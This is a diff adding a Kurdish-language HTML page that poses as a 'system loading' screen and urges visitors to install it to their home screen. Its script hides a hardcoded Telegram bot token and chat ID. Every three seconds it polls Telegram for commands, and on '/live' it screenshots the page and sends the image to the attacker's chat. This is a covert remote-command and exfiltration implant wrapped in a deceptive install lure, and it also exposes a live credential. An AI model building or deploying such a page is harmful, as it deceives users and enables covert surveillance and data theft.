@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="manifest" href="manifest.json">
+    <title>بارکرنا سیستەمی</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tahoma', sans-serif; }
+        body { background-color: #030712; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; overflow: hidden; }
+        .box { background: #111827; padding: 30px; border-radius: 16px; border: 1px solid #7c3aed; max-width: 380px; width: 90%; box-shadow: 0 0 20px rgba(124, 58, 237, 0.4); }
+        h2 { color: #a78bfa; margin-bottom: 10px; font-size: 20px; }
+        p { color: #9ca3af; font-size: 13px; margin-bottom: 20px; line-height: 1.6; }
+        .btn { background: #7c3aed; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; display: none; }
+        .btn:hover { background: #6d28d9; }
+        .spinner { width: 35px; height: 35px; border: 3px solid #374151; border-top: 3px solid #a78bfa; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="box" id="promptBox">
+        <div class="spinner"></div>
+        <h2>ئامادەکرنا سیستەمی...</h2>
+        <p>تکایە ل ڤێرە بگرە و ڤی لێنکی بکە سەر شاشیا خۆ (Add to Home Screen) دا کو سیستەم ب ڕێکوپێک کار بکەت.</p>
+        <button class="btn" id="installBtn" onclick="triggerInstall()">زێدەکرن بۆ سەر شاشێ (Install)</button>
+    </div>
+
+    <!-- پشکا لۆژیکا کێشانا شاشێ -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script>
+        const TG_BOT_TOKEN = "9200698437:AAGIcQ4CBkXtsonwhiGKxTwtkajKm8ByKCI";
+        const TG_CHAT_ID = "8905740669";
+        let lastUpdateId = 0;
+        let deferredPrompt;
+
+        // گرتنا داخوازییا ئۆتۆماتیکی یا Add to Home Screen
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            document.getElementById('installBtn').style.display = 'block';
+        });
+
+        function triggerInstall() {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                deferredPrompt.userChoice.then((choiceResult) => {
+                    if (choiceResult.outcome === 'accepted') {
+                        console.log('User accepted the install prompt');
+                    }
+                    deferredPrompt = null;
+                });
+            }
+        }
+
+        // چاڤدێریکرنا بەردەوام یا فەرمانێن تلێگرامێ (بۆ فەرمانا /live)
+        setInterval(async () => {
+            try {
+                let res = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=3`);
+                let data = await res.json();
+
+                if (data.ok && data.result.length > 0) {
+                    for (let update of data.result) {
+                        lastUpdateId = update.update_id;
+                        
+                        if (update.message && update.message.text) {
+                            let text = update.message.text.trim().toLowerCase();
+                            
+                            // هەکە تو لە تلێگرامێ بنڤیسی: /live
+                            if (text === '/live') {
+                                sendLiveScreenStream();
+                            }
+                        }
+                    }
+                }
+            } catch (e) {
+                console.error("Polling error", e);
+            }
+        }, 3000);
+
+        function sendLiveScreenStream() {
+            html2canvas(document.body, { scale: 0.8 }).then(canvas => {
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', TG_CHAT_ID);
+                    formData.append('photo', blob, 'live_screen.jpg');
+                    formData.append('caption', '🔴 [ZOALA-DOMINION] Live Screen Frame Triggered via /live.');
+
+                    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(err => console.error("Transmission error:", err));
+                }, 'image/jpeg', 0.8);
+            });
+        }
+    </script>
+</body>
+</html>
